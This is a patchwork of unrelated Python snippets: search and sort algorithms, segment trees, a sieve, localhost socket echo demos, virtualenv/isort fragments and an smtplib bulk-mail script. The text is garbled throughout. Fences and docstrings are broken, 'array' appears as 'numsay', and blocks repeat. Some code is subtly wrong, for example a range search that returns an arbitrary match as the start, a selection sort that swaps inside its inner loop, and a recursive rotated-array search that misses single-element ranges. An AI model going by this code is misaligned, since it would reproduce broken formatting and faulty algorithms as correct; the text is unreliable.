            [18, 21, 23, 26, 30],
        ],
        20,
    )
)
````

````py
Suppose an numsay sorted in ascending order is rotated at some pivot unknown to you beforehand.

(i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]).

You are given a target value to search. If found in the numsay return its index, otherwise return -1.

You may assume no duplicate exists in the numsay.

Your algorithm's runtime complexity must be in the order of O(log n).```


```py

# def main(nums, target):
#     if not nums:
#         return -1
#     l, r = two_sorted(nums)
#     ind = binary_search(nums, 0, l, target)
#     if ind == -1:
#         ind = binary_search(nums, r + 1, len(nums) - 1, target)
#         if ind == -1:
#             return -1
#     return ind
#
# def two_sorted(nums):
#     l = 0
#     r = len(nums) - 1
#     while l < r:
#         mid = (l + r) // 2
#         if nums[mid] > nums[l]:
#             l = mid
#         else:
#             r = mid
#     return (l, r)
#
#
# def binary_search(nums, l, r, target):
#     while l <= r:
#         mid = (l + r) // 2
#         if nums[mid] == target:
#             return mid
#         elif nums[mid] > target:
#             r = mid - 1
#         else:
#             l = mid + 1
#     return -1


def main(nums, target):
    # left pointer
    l = 0
    # right pointer
    r = len(nums) - 1
    while l <= r:
        mid = (l + r) // 2
        if nums[mid] == target:
            return mid
        # if the first half of the array is sorted
        if nums[l] <= nums[mid]:
            # check if the target point is in that half
            if nums[l] <= target < nums[mid]:
                # move the right pointer
                r = mid - 1
            # else move the left pointer
            else:
                l = mid + 1
        else:
            if nums[mid] < target <= nums[r]:
                l = mid + 1
            else:
                r = mid - 1
    return -1


print(main([1, 3], 3))

#
# Search a key in a row wise and column wise sorted (non-decreasing) matrix.
# m- Number of rows in the matrix
# n- Number of columns in the matrix
# T(n)- O(m+n)
#


def search_in_a_sorted_matrix(mat, m, n, key):
    i, j = m - 1, 0
    while i >= 0 and j < n:
        if key == mat[i][j]:
            print("Key %s found at row- %s column- %s" % (key, i + 1, j + 1))
            return
        if key < mat[i][j]:
            i -= 1
        else:
            j += 1
    print("Key %s not found" % (key))


def main():
    mat = [[2, 5, 7], [4, 8, 13], [9, 11, 15], [12, 17, 20]]
    key = 13
    print(mat)
    search_in_a_sorted_matrix(mat, len(mat), len(mat[0]), key)


if __name__ == "__main__":
    main()
````

````py
Given a sorted array and a target value, return the index if the target is
found. If not, return the index where it would be if it were inserted in order.

For example:
[1,3,5,6], 5 -> 2
[1,3,5,6], 2 -> 1
[1,3,5,6], 7 -> 4
[1,3,5,6], 0 -> 0```


```py


def search_insert(array, val):
    low = 0
    high = len(array) - 1
    while low <= high:
        mid = low + (high - low) // 2
        if val > array[mid]:
            low = mid + 1
        else:
            high = mid - 1
    return low
````

````py
Given an array of integers nums sorted in ascending order, find the starting
and ending position of a given target value. If the target is not found in the
array, return [-1, -1].

For example:
Input: nums = [5,7,7,8,8,8,10], target = 8
Output: [3,5]
Input: nums = [5,7,7,8,8,8,10], target = 11
Output: [-1,-1]```


```py


def search_range(nums, target):
    """
    :type nums: List[int]
    :type target: int
    :rtype: List[int]
    """
    low = 0
    high = len(nums) - 1
    while low <= high:
        mid = low + (high - low) // 2
        if target < nums[mid]:
            high = mid - 1
        elif target > nums[mid]:
            low = mid + 1
        else:
            break

    for j in range(len(nums) - 1, -1, -1):
        if nums[j] == target:
            return [mid, j]

    return [-1, -1]
````

````py
Search in Rotated Sorted Array
Suppose an array sorted in ascending order is rotated at some pivot unknown
to you beforehand. (i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]).

You are given a target value to search. If found in the array return its index,
otherwise return -1.

Your algorithm's runtime complexity must be in the order of O(log n).
---------------------------------------------------------------------------------
Explanation algorithm:

In classic binary search, we compare val with the midpoint to figure out if
val belongs on the low or the high side. The complication here is that the
array is rotated and may have an inflection point. Consider, for example:

Array1: [10, 15, 20, 0, 5]
Array2: [50, 5, 20, 30, 40]

Note that both arrays have a midpoint of 20, but 5 appears on the left side of
one and on the right side of the other. Therefore, comparing val with the
midpoint is insufficient.

However, if we look a bit deeper, we can see that one half of the array must be
ordered normally(increasing order). We can therefore look at the normally ordered
half to determine whether we should search the low or hight side.

For example, if we are searching for 5 in Array1, we can look at the left element (10)
and middle element (20). Since 10 < 20, the left half must be ordered normally. And, since 5
is not between those, we know that we must search the right half

In array2, we can see that since 50 > 20, the right half must be ordered normally. We turn to
the middle 20, and right 40 element to check if 5 would fall between them. The value 5 would not
Therefore, we search the left half.

There are 2 possible solution: iterative and recursion.
Recursion helps you understand better the above algorithm explanation```


```py


def search_rotate(array, val):
    low, high = 0, len(array) - 1
    while low <= high:
        mid = (low + high) // 2
        if val == array[mid]:
            return mid

        if array[low] <= array[mid]:
            if array[low] <= val <= array[mid]:
                high = mid - 1
            else:
                low = mid + 1
        else:
            if array[mid] <= val <= array[high]:
                low = mid + 1
            else:
                high = mid - 1

    return -1


# Recursion technique
def search_rotate_recur(array, low, high, val):
    if low >= high:
        return -1
    mid = (low + high) // 2
    if val == array[mid]:  # found element
        return mid
    if array[low] <= array[mid]:
        if array[low] <= val <= array[mid]:
            return search_rotate_recur(array, low, mid - 1, val)  # Search left
        else:
            return search_rotate_recur(array, mid + 1, high, val)  # Search right
    else:
        if array[mid] <= val <= array[high]:
            return search_rotate_recur(array, mid + 1, high, val)  # Search right
        else:
            return search_rotate_recur(array, low, mid - 1, val)  # Search left
````

````py
Search in Rotated Sorted Array

Suppose an array sorted in ascending order is rotated at some pivot unknown to you beforehand.
(i.e., [0,1,2,4,5,6,7] might become [4,5,6,7,0,1,2]).
You are given a target value to search. If found in the array return its index, otherwise return -1.
You may assume no duplicate exists in the array.

Input: [4, 5, 6, 7, 0, 1, 2], 0
Output: 4

Input: [4, 5, 6, 7, 0, 1, 2], 3
Output: -1

=========================================
Use binary search twice, first time to find the pivot (index where the array is rotated)
and the second time to find the target.
    Time Complexity:    O(LogN)
    Space Complexity:   O(1)```


```py


############
# Solution #
############


def search_rotated_sorted_array(nums, target):
    n = len(nums)
    pivot = find_pivot(nums, 0, n) + 1
    if pivot > n:
        return -1

    if nums[0] <= target:
        return find_element(nums, 0, pivot - 1, target)
    return find_element(nums, pivot, n - 1, target)


def find_pivot(nums, left, right):
    while left < right - 1:
        mid = left + (right - left) // 2

        if nums[left] < nums[mid]:
            left = mid
        else:
            right = mid

    return left


def find_element(nums, left, right, target):
    while left <= right:
        mid = left + (right - left) // 2

        if nums[mid] == target:
            return mid

        if nums[mid] < target:
            left = mid + 1
        else:
            right = mid - 1

    return -1


###########
# Testing #
###########

# Test 1
# Correct result => 4
print(search_rotated_sorted_array([4, 5, 6, 7, 0, 1, 2], 0))

# linear search O(n)
def name_in_phonebook(to_find, phonebook):
    for name in phonebook:
        if name == to_find:
            return True
    return False

# binary search O(log n)
def name_in_phonebook_2(to_find, name):
    # sentinal , edge case
    if len(to_find) == 0:
        return False
    # set first element to zero
    first = 0
    # set the last items to size - 1
    last = (len(to_find) - 1)
    # set a found flag to false
    found = False

    # loop until either found or end of list
    while first <= last and not found:
        # find the middle of the list using interger division //
        middle = (first + last) // 2

        # if found update found variable
        if to_find[middle] == name:
            found = True
        # otherwise
        else:
            # if name  is to the left of the data
            if name < to_find[middle]:
                # search the lower half
                last = middle - 1
            # otherwise
            else:
                # search the upper half
                first = middle + 1
    # return found
    return found

from __future__ import annotations

from typing import Union


def search_in_a_sorted_matrix(
    mat: list[list], m: int, n: int, key: Union[int, float]
) -> None:
    """
    >>> search_in_a_sorted_matrix(
    ...     [[2, 5, 7], [4, 8, 13], [9, 11, 15], [12, 17, 20]], 3, 3, 5)
    Key 5 found at row- 1 column- 2
    >>> search_in_a_sorted_matrix(
    ...     [[2, 5, 7], [4, 8, 13], [9, 11, 15], [12, 17, 20]], 3, 3, 21)
    Key 21 not found
    >>> search_in_a_sorted_matrix(
    ...     [[2.1, 5, 7], [4, 8, 13], [9, 11, 15], [12, 17, 20]], 3, 3, 2.1)
    Key 2.1 found at row- 1 column- 1
    >>> search_in_a_sorted_matrix(
    ...     [[2.1, 5, 7], [4, 8, 13], [9, 11, 15], [12, 17, 20]], 3, 3, 2.2)
    Key 2.2 not found
    """
    i, j = m - 1, 0
    while i >= 0 and j < n:
        if key == mat[i][j]:
            print(f"Key {key} found at row- {i + 1} column- {j + 1}")
            return
        if key < mat[i][j]:
            i -= 1
        else:
            j += 1
    print(f"Key {key} not found")


def main():
    mat = [[2, 5, 7], [4, 8, 13], [9, 11, 15], [12, 17, 20]]
    x = int(input("Enter the element to be searched:"))
    print(mat)
    search_in_a_sorted_matrix(mat, len(mat), len(mat[0]), x)


if __name__ == "__main__":
    import doctest

    doctest.testmod()
    main()

def seatsInTheater(nCols, nRows, col, row):
    """
    Given the total number of rows and columns
    in the theater (nRows and nCols, respectively),
    and the row and column you're sitting in, return
    the number of people who sit strictly behind
    you and in your column or to the left, assuming
    all seats are occupied.
    """
    return (nRows - row) * (nCols - col + 1)
````

````py
Implementing Secant method in Python
Author: dimgrichr```


```py
from math import exp


def f(x: float) -> float:
    """
    >>> f(5)
    39.98652410600183
    """
    return 8 * x - 2 * exp(-x)


def secant_method(lower_bound: float, upper_bound: float, repeats: int) -> float:
    """
    >>> secant_method(1, 3, 2)
    0.2139409276214589
    """
    x0 = lower_bound
    x1 = upper_bound
    for i in range(0, repeats):
        x0, x1 = x1, x1 - (f(x1) * (x1 - x0)) / (f(x1) - f(x0))
    return x1


if __name__ == "__main__":
    print(f"Example: {secant_method(1, 3, 2)}")
````

````py
Secret Santa

Secret Santa is a game in which a group of friends or colleagues exchange Christmas presents anonymously,
each member of the group being assigned another member for whom to provide a small gift.
You're given a list of names, make a random pairs (each participant should have another name as pair).
Return an array with pairs represented as tuples.

Input: ['a', 'b', 'c']
Output: This is a nondeterministic algorithm, more solutions exists, here are 2 possible solutions:
    [('a', 'b'), ('b', 'c'), ('c', 'a')], [('a', 'c'), ('c', 'b'), ('b', 'a')]

=========================================
Shuffle the array (this algorithm is explained in shuffle_array.py) and pair the current element
with the next element (neighbouring).
    Time Complexity:    O(N)
    Space Complexity:   O(N)```


```py


############
# Solution #
############

from random import randint


def secret_santa(names):
    # or use shuffle method from random module (from random import shuffle)
    shuffle_array(names)
    pairs = []

    n = len(names)
    prev = names[-1]  # or names[n - 1]

    for curr in names:
        pairs.append((prev, curr))
        prev = curr

    return pairs


def shuffle_array(arr):
    n = len(arr)

    for i in range(n):
        rand = randint(i, n - 1)  # or randint(0, i) it's same
        arr[i], arr[rand] = arr[rand], arr[i]  # swap elements

    # the original arr is already changed
    return arr


###########
# Testing #
###########

# Test 1
# Correct result => nondeterministic algorithm, many solutions exist
print(secret_santa(["a", "b", "c"]))
````

```pyDefines all sections isort uses by default"""
from typing import Tuple

FUTURE: str = "FUTURE"
STDLIB: str = "STDLIB"
THIRDPARTY: str = "THIRDPARTY"
FIRSTPARTY: str = "FIRSTPARTY"
LOCALFOLDER: str = "LOCALFOLDER"
DEFAULT: Tuple[str, ...] = (FUTURE, STDLIB, THIRDPARTY, FIRSTPARTY, LOCALFOLDER)

from __future__ import absolute_import, unicode_literals

from abc import ABCMeta, abstractmethod

from six import add_metaclass


@add_metaclass(ABCMeta)
class Seeder(object):
    """A seeder will install some seed packages into a virtual environment."""

    # noinspection PyUnusedLocal
    def __init__(self, options, enabled):
        """

        :param options: the parsed options as defined within :meth:`add_parser_arguments`
        :param enabled: a flag weather the seeder is enabled or not
        """
        self.enabled = enabled
        self.env = options.env

    @classmethod
    def add_parser_arguments(cls, parser, interpreter, app_data):
        """
        Add CLI arguments for this seed mechanisms.

        :param parser: the CLI parser
        :param app_data: the CLI parser
        :param interpreter: the interpreter this virtual environment is based of
        """
        raise NotImplementedError

    @abstractmethod
    def run(self, creator):
        """Perform the seed operation.

        :param creator: the creator (based of :class:`virtualenv.create.creator.Creator`) we used to create this \
        virtual environment
        """
        raise NotImplementedError

from __future__ import absolute_import, unicode_literals

from .base import ComponentBuilder


class SeederSelector(ComponentBuilder):
    def __init__(self, interpreter, parser):
        possible = self.options("virtualenv.seed")
        super(SeederSelector, self).__init__(interpreter, parser, "seeder", possible)

    def add_selector_arg_parse(self, name, choices):
        self.parser.add_argument(
            "--{}".format(name),
            choices=choices,
            default=self._get_default(),
            required=False,
            help="seed packages install method",
        )
        self.parser.add_argument(
            "--no-seed",
            "--without-pip",
            help="do not install seed packages",
            action="store_true",
            dest="no_seed",
        )

    @staticmethod
    def _get_default():
        return "app-data"

    def handle_selected_arg_parse(self, options):
        return super(SeederSelector, self).handle_selected_arg_parse(options)

    def create(self, options):
        return self._impl_class(options)

class Seeker:
    def __getattribute__(self, name):
        if name not in self.__dict__:
            return "<not found>"
        return self.__dict__[name]


s = Seeker()
print(s.id)

import math


class SegmentTree:
    def __init__(self, A):
        self.N = len(A)
        self.st = [0] * (
            4 * self.N
        )  # approximate the overall size of segment tree with array N
        self.build(1, 0, self.N - 1)

    def left(self, idx):
        return idx * 2

    def right(self, idx):
        return idx * 2 + 1

    def build(self, idx, l, r):  # noqa: E741
        if l == r:  # noqa: E741
            self.st[idx] = A[l]
        else:
            mid = (l + r) // 2
            self.build(self.left(idx), l, mid)
            self.build(self.right(idx), mid + 1, r)
            self.st[idx] = max(self.st[self.left(idx)], self.st[self.right(idx)])

    def update(self, a, b, val):
        return self.update_recursive(1, 0, self.N - 1, a - 1, b - 1, val)

    def update_recursive(self, idx, l, r, a, b, val):  # noqa: E741
        """
        update(1, 1, N, a, b, v) for update val v to [a,b]
        """
        if r < a or l > b:
            return True
        if l == r:  # noqa: E741
            self.st[idx] = val
            return True
        mid = (l + r) // 2
        self.update_recursive(self.left(idx), l, mid, a, b, val)
        self.update_recursive(self.right(idx), mid + 1, r, a, b, val)
        self.st[idx] = max(self.st[self.left(idx)], self.st[self.right(idx)])
        return True

    def query(self, a, b):
        return self.query_recursive(1, 0, self.N - 1, a - 1, b - 1)

    def query_recursive(self, idx, l, r, a, b):  # noqa: E741
        """
        query(1, 1, N, a, b) for query max of [a,b]
        """
        if r < a or l > b:
            return -math.inf
        if l >= a and r <= b:  # noqa: E741
            return self.st[idx]
        mid = (l + r) // 2
        q1 = self.query_recursive(self.left(idx), l, mid, a, b)
        q2 = self.query_recursive(self.right(idx), mid + 1, r, a, b)
        return max(q1, q2)

    def showData(self):
        showList = []
        for i in range(1, N + 1):
            showList += [self.query(i, i)]
        print(showList)


if __name__ == "__main__":
    A = [1, 2, -4, 7, 3, -5, 6, 11, -20, 9, 14, 15, 5, 2, -8]
    N = 15
    segt = SegmentTree(A)
    print(segt.query(4, 6))
    print(segt.query(7, 11))
    print(segt.query(7, 12))
    segt.update(1, 3, 111)
    print(segt.query(1, 15))
    segt.update(7, 8, 235)
    segt.showData()
```

```py
Segment trees are special kind of trees that allows answering range queries and updating values in an array effectively (both in O(logn)),
For an array, its segment tree will have as leaf nodes = the elements of the array,
and its internal nodes store the value of a preprocessed value, like the sum of all its children

eg arr : [1,2,3,4]
parent node of (1,2) = 3, parent node of (3,4) = 7
parent node of (3,7) = 10 (this will also be the root node)

We are using an array approach to store the tree, so in above example :
tree = [0, 10, 3, 7, 1, 2, 3, 4]
index= [0,  1, 2, 3, 4, 5, 6, 7]
0 has been added as first element to ease the calculations
we can see the the array elements (leaf nodes) are stored as the second half of array
and the parent node of any index is such that index_of_parent = index_of_node / 2
like elements 1 and 2 at index 4 and 5, have their parent 3 at index 2 (4/2=2, 5/2=2.5=2)
```

```py

from math import ceil, log2


def segment_tree_creation(arr):
    """The function creates a segment tree in O(n) time
        arguments : array, whose corresponding segment tree is to be made
        returns : the correspoding segment tree in a list format
    """
    n = len(arr)

    # for n leaf nodes, there are maximum double of 2**max_height-1 nodes, adding extra 0th elem for ease of calculations
    height = ceil(log2(n))
    m = 2 * (2 ** height)
    tree = [0] * m

    # filling the second half of the tree list (leaf nodes) with the array elements
    for i in range(n):
        index = i + int(m / 2)
        tree[index] = arr[i]

    # creating the internal nodes, calculating the from leaf to the root
    for i in range(int(m / 2) - 1, 0, -1):
        tree[i] = tree[2 * i] + tree[2 * i + 1]

    return tree


# DRIVER CODE
if __name__ == "__main__":

    arr = [5, 8, 6, 3, 2, 7, 4, 6]
    print("\nOriginal array : ", arr)

    seg_tree = segment_tree_creation(arr)
    print("\nSegment tree : ", seg_tree, "\n")

    # input : [5, 8, 6, 3, 2, 7, 4, 6]
    # output: [0, 41, 22, 19, 13, 9, 9, 10, 5, 8, 6, 3, 2, 7, 4, 6]

    # input : [1,2,3,4]
    # output: [0, 10, 3, 7, 1, 2, 3, 4]

    # input : [-2, 5, 7, 1, 10]
    # output: [0, 21, 11, 10, 3, 8, 10, 0, -2, 5, 7, 1, 10, 0, 0, 0]
```

```pySegmented Sieve."""

import math


def sieve(n):
    """Segmented Sieve."""
    in_prime = []
    start = 2
    end = int(math.sqrt(n))  # Size of every segment
    temp = [True] * (end + 1)
    prime = []

    while start <= end:
        if temp[start] is True:
            in_prime.append(start)
            for i in range(start * start, end + 1, start):
                if temp[i] is True:
                    temp[i] = False
        start += 1
    prime += in_prime

    low = end + 1
    high = low + end - 1
    if high > n:
        high = n

    while low <= n:
        temp = [True] * (high - low + 1)
        for each in in_prime:

            t = math.floor(low / each) * each
            if t < low:
                t += each

            for j in range(t, high + 1, each):
                temp[j - low] = False

        for j in range(len(temp)):
            if temp[j] is True:
                prime.append(j + low)

        low = high + 1
        high = low + end - 1
        if high > n:
            high = n

    return prime


print(sieve(10 ** 6))
```

````pyImport basic exposure of libzmq C API as a backend"""

# Copyright (C) PyZMQ Developers
# Distributed under the terms of the Modified BSD License.

from typing import Dict
from importlib import import_module

public_api = [
    'Context',
    'Socket',
    'Frame',
    'Message',
    'device',
    'proxy',
    'proxy_steerable',
    'zmq_poll',
    'strerror',
    'zmq_errno',
    'has',
    'curve_keypair',
    'curve_public',
    'constants',
    'zmq_version_info',
    'IPC_PATH_MAX_LEN',
]


def select_backend(name: str) -> Dict:
    """Select the pyzmq backend"""
    try:
        mod = import_module(name)
    except ImportError:
        raise
    except Exception as e:
        raise ImportError(f"Importing {name} failed with {e}") from e

    ns = {}
    for key in public_api:
        ns[key] = getattr(mod, key)
    return ns

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys

messages = [
    'This is the message. ',
    'It will be sent ',
    'in parts.',
]
server_address = ('localhost', 10000)

# Create a TCP/IP socket
socks = [
    socket.socket(socket.AF_INET, socket.SOCK_STREAM),
    socket.socket(socket.AF_INET, socket.SOCK_STREAM),
]

# Connect the socket to the port where the server is listening
print('connecting to {} port {}'.format(*server_address),
      file=sys.stderr)
for s in socks:
    s.connect(server_address)

for message in messages:
    outgoing_data = message.encode()

    # Send messages on both sockets
    for s in socks:
        print('{}: sending {!r}'.format(s.getsockname(),
                                        outgoing_data),
              file=sys.stderr)
        s.send(outgoing_data)

    # Read responses on both sockets
    for s in socks:
        data = s.recv(1024)
        print('{}: received {!r}'.format(s.getsockname(),
                                         data),
              file=sys.stderr)
        if not data:
            print('closing socket', s.getsockname(),
                  file=sys.stderr)
            s.close()

# Copyright (c) 2010 Doug Hellmann.  All rights reserved.
#```


```pyClient half of echo example```


```py

#end_pymotw_header
import socket
import sys
import time

# Create a TCP/IP socket
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

# Connect the socket to the port where the server is listening
server_address = ('localhost', 10000)
print('connecting to {} port {}'.format(*server_address),
      file=sys.stderr)
sock.connect(server_address)

time.sleep(1)

messages = [
    'Part one of the message.',
    'Part two of the message.',
]
amount_expected = len(''.join(messages))

try:

    # Send data
    for message in messages:
        data = message.encode()
        print('sending {!r}'.format(data), file=sys.stderr)
        sock.sendall(data)
        time.sleep(1.5)

    # Look for the response
    amount_received = 0

    while amount_received < amount_expected:
        data = sock.recv(16)
        amount_received += len(data)
        print('received {!r}'.format(data), file=sys.stderr)

finally:
    print('closing socket', file=sys.stderr)
    sock.close()
````

````py
Data structures for the selection.```


```py
from enum import Enum

__all__ = [
    "SelectionType",
    "PasteMode",
    "SelectionState",
]


class SelectionType(Enum):
    """
    Type of selection.
    """

    #: Characters. (Visual in Vi.)
    CHARACTERS = "CHARACTERS"

    #: Whole lines. (Visual-Line in Vi.)
    LINES = "LINES"

    #: A block selection. (Visual-Block in Vi.)
    BLOCK = "BLOCK"


class PasteMode(Enum):
    EMACS = "EMACS"  # Yank like emacs.
    VI_AFTER = "VI_AFTER"  # When pressing 'p' in Vi.
    VI_BEFORE = "VI_BEFORE"  # When pressing 'P' in Vi.


class SelectionState:
    """
    State of the current selection.

    :param original_cursor_position: int
    :param type: :class:`~.SelectionType`
    """

    def __init__(
        self,
        original_cursor_position: int = 0,
        type: SelectionType = SelectionType.CHARACTERS,
    ) -> None:

        self.original_cursor_position = original_cursor_position
        self.type = type
        self.shift_mode = False

    def enter_shift_mode(self) -> None:
        self.shift_mode = True

    def __repr__(self) -> str:
        return "%s(original_cursor_position=%r, type=%r)" % (
            self.__class__.__name__,
            self.original_cursor_position,
            self.type,
        )

from typing import Optional

from pip._internal.models.format_control import FormatControl


class SelectionPreferences:
    """
    Encapsulates the candidate selection preferences for downloading
    and installing files.
    """

    __slots__ = [
        "allow_yanked",
        "allow_all_prereleases",
        "format_control",
        "prefer_binary",
        "ignore_requires_python",
    ]

    # Don't include an allow_yanked default value to make sure each call
    # site considers whether yanked releases are allowed. This also causes
    # that decision to be made explicit in the calling code, which helps
    # people when reading the code.
    def __init__(
        self,
        allow_yanked: bool,
        allow_all_prereleases: bool = False,
        format_control: Optional[FormatControl] = None,
        prefer_binary: bool = False,
        ignore_requires_python: Optional[bool] = None,
    ) -> None:
        """Create a SelectionPreferences object.

        :param allow_yanked: Whether files marked as yanked (in the sense
            of PEP 592) are permitted to be candidates for install.
        :param format_control: A FormatControl object or None. Used to control
            the selection of source packages / binary packages when consulting
            the index and links.
        :param prefer_binary: Whether to prefer an old, but valid, binary
            dist over a new source dist.
        :param ignore_requires_python: Whether to ignore incompatible
            "Requires-Python" values in links. Defaults to False.
        """
        if ignore_requires_python is None:
            ignore_requires_python = False

        self.allow_yanked = allow_yanked
        self.allow_all_prereleases = allow_all_prereleases
        self.format_control = format_control
        self.prefer_binary = prefer_binary
        self.ignore_requires_python = ignore_requires_python

# sample input : 4
#                 -1,0,3,57,89,9
# output        : -1,0,3,9,57,89


def selection_sort(arr, n):
    imin = 0
    for i in range(n - 1):
        imin = i
        for j in range(i + 1, n):
            if arr[i] >= arr[j]:
                arr[i], arr[j] = arr[j], arr[i]
                imin = j
    return arr


arr = [-1, 0, 3, 57, 89, 9]

print(selection_sort(arr, len(arr)))
````

````py
ID: 556c4a0f-f488-4a6b-99b4-4d09e006be23
Grokking Algorithms, Page 32
Python Algorithms, Page 75

This implementation is different than the ones in the referenced books, which are different from each other.
It uses methods and functions that do iteration versus for-loops. Just remember it's still O(n^2).```


```py
from collections.abc import MutableSequence

from src.typehints import T


def selection_sort_iter(seq: MutableSequence[T]) -> None:
    """Use selection sort iteratively on a list in-place."""
    for i, val in enumerate(seq):
        min_val = min(seq[i:])
        min_val_i = seq.index(min_val, i)  # First index of min_val at or after i
        seq[i] = min_val
        seq[min_val_i] = val
````

````py
ID: 556c4a0f-f488-4a6b-99b4-4d09e006be23
Grokking Algorithms, Page 32
Python Algorithms, Page 75

This implementation is different than the ones in the referenced books, which are different from each other.
It uses methods and functions that do iteration versus for-loops. Just remember it's still O(n^2).```


```py
from collections.abc import MutableSequence

from src.typehints import T


def selection_sort_iter(seq: MutableSequence[T]) -> None:
    """Use selection sort iteratively on a list in-place."""
    for i, val in enumerate(seq):
        min_val = min(seq[i:])
        min_val_i = seq.index(min_val, i)  # First index of min_val at or after i
        seq[i] = min_val
        seq[min_val_i] = val
````

````py
ID: 66b1e371-f33a-4afb-9dbb-f85d35204c10
Python Algorithms, Page 75```


```py
from collections.abc import MutableSequence

from src.typehints import T


def selection_sort_recur(seq: MutableSequence[T], i=0) -> None:
    """Use selection sort recursively on a list in-place."""
    if i >= len(seq) - 1:
        return
    min_val = min(seq[i:])
    min_val_i = seq.index(min_val, i)
    seq[min_val_i] = seq[i]
    seq[i] = min_val
    selection_sort_recur(seq, i + 1)
````

````py
ID: 66b1e371-f33a-4afb-9dbb-f85d35204c10
Python Algorithms, Page 75```


```py
from collections.abc import MutableSequence

from src.typehints import T


def selection_sort_recur(seq: MutableSequence[T], i=0) -> None:
    """Use selection sort recursively on a list in-place."""
    if i >= len(seq) - 1:
        return
    min_val = min(seq[i:])
    min_val_i = seq.index(min_val, i)
    seq[min_val_i] = seq[i]
    seq[i] = min_val
    selection_sort_recur(seq, i + 1)

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyEcho client using selectors instead of select directly.```


```py

#end_pymotw_header
import selectors
import socket

mysel = selectors.DefaultSelector()
keep_running = True
outgoing = [
    b'It will be repeated.',
    b'This is the message.  ',
]
bytes_sent = 0
bytes_received = 0

# Connecting is a blocking operation, so call setblocking()
# after it returns.
server_address = ('localhost', 10000)
print('connecting to {} port {}'.format(*server_address))
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(server_address)
sock.setblocking(False)

# Set up the selector to watch for when the socket is ready
# to send data as well as when there is data to read.
mysel.register(
    sock,
    selectors.EVENT_READ | selectors.EVENT_WRITE,
)

while keep_running:
    print('waiting for I/O')
    for key, mask in mysel.select(timeout=1):
        connection = key.fileobj
        client_address = connection.getpeername()
        print('client({})'.format(client_address))

        if mask & selectors.EVENT_READ:
            print('  ready to read')
            data = connection.recv(1024)
            if data:
                # A readable client socket has data
                print('  received {!r}'.format(data))
                bytes_received += len(data)

            # Interpret empty result as closed connection,
            # and also close when we have received a copy
            # of all of the data sent.
            keep_running = not (
                data or
                (bytes_received and
                 (bytes_received == bytes_sent))
            )

        if mask & selectors.EVENT_WRITE:
            print('  ready to write')
            if not outgoing:
                # We are out of messages, so we no longer need to
                # write anything. Change our registration to let
                # us keep reading responses from the server.
                print('  switching to read-only')
                mysel.modify(sock, selectors.EVENT_READ)
            else:
                # Send the next message.
                next_msg = outgoing.pop()
                print('  sending {!r}'.format(next_msg))
                sock.sendall(next_msg)
                bytes_sent += len(next_msg)

print('shutting down')
mysel.unregister(connection)
connection.close()
mysel.close()

# Copyright (c) 2016 Doug Hellmann.  All rights reserved.
# Written for https://pymotw.com
#```


```pyEcho server using selectors instead of select directly.```


```py

#end_pymotw_header
import selectors
import socket

mysel = selectors.DefaultSelector()
keep_running = True


def read(connection, mask):
    "Callback for read events"
    global keep_running

    client_address = connection.getpeername()
    print('read({})'.format(client_address))
    data = connection.recv(1024)
    if data:
        # A readable client socket has data
        print('  received {!r}'.format(data))
        connection.sendall(data)
    else:
        # Interpret empty result as closed connection
        print('  closing')
        mysel.unregister(connection)
        connection.close()
        # Tell the main loop to stop
        keep_running = False


def accept(sock, mask):
    "Callback for new connections"
    new_connection, addr = sock.accept()
    print('accept({})'.format(addr))
    new_connection.setblocking(False)
    mysel.register(new_connection, selectors.EVENT_READ, read)


server_address = ('localhost', 10000)
print('starting up on {} port {}'.format(*server_address))
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.setblocking(False)
server.bind(server_address)
server.listen(5)

mysel.register(server, selectors.EVENT_READ, accept)

while keep_running:
    print('waiting for I/O')
    for key, mask in mysel.select(timeout=1):
        callback = key.data
        callback(key.fileobj, mask)

print('shutting down')
mysel.close()

try:
    import pandas as pd
    import smtplib
    import re
    import os
except ImportError:
    print("\n some modules are not installed\n installing them for you :-)")
    cmd = "pip install pandas"
    cmd1 = "pip install smtplib"
    cmd2 = "pip install openpyxl"
    os.system(cmd)
    os.system(cmd1)
    os.system(cmd2)

# input...........
SenderAddress = input("your email :  ").strip()
print(
    "\nplease allow 'enable less secured apps ' option on this account to send emails\n"
)
password = input("your password : ").strip()
# ...........

# using pandas and openpyxl for reading from email.xlsx  and setting up smtp server
e = pd.read_excel("email.xlsx")
emails = e['Emails'].values
server = smtplib.SMTP("smtp.gmail.com", 587)
server.starttls()
try:
    server.login(SenderAddress, password)
except smtplib.SMTPAuthenticationError:
    print(
        "\n[+]Username or password not accepted or not enabled less secured apps on the above Mail account \n"
    )

subject = "Hi there"

# reading subject from msg.txt....

a_file = open("msg.txt")
lines = a_file.readlines()

msg = ""
for line in lines:
    msg = msg + line
a_file.close()
# ..........

body = "Subject: {}\n\n{}".format(subject, msg)
# ........send mail.....

try:
    for email in emails:
        server.sendmail(SenderAddress, email, body)
    server.quit()
    print("\nemail successully sent to :\n")
    for mail in emails:
        print(mail + "\n")

except smtplib.SMTPSenderRefused:
    print("\n[+] could not send emails :-( ")

def send_file(filename: str = "mytext.txt", testing: bool = False) -> None:
    import socket

    port = 12312  # Reserve a port for your service.
    sock = socket.socket()  # Create a socket object
    host = socket.gethostname()  # Get local machine name
    sock.bind((host, port))  # Bind to the port
    sock.listen(5)  # Now wait for client connection.

    print("Server listening....")

    while True:
        conn, addr = sock.accept()  # Establish connection with client.
        print(f"Got connection from {addr}")
        data = conn.recv(1024)
        print(f"Server received: {data = }")

        with open(filename, "rb") as in_file:
            data = in_file.read(1024)
            while data:
                conn.send(data)
                print(f"Sent {data!r}")
                data = in_file.read(1024)

        print("Done sending")
        conn.close()
        if testing:  # Allow the test to complete
            break

    sock.shutdown(1)
    sock.close()


if __name__ == "__main__":
    send_file()

#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from email import encoders
from email.header import Header
from email.mime.text import MIMEText
from email.utils import parseaddr, formataddr
import smtplib


def _format_addr(s):
    name, addr = parseaddr(s)
    return formataddr((Header(name, "utf-8").encode(), addr))


from_addr = input("From: ")
password = input("Password: ")
to_addr = input("To: ")
smtp_server = input("SMTP server: ")

msg = MIMEText("hello, send by Python...", "plain", "utf-8")
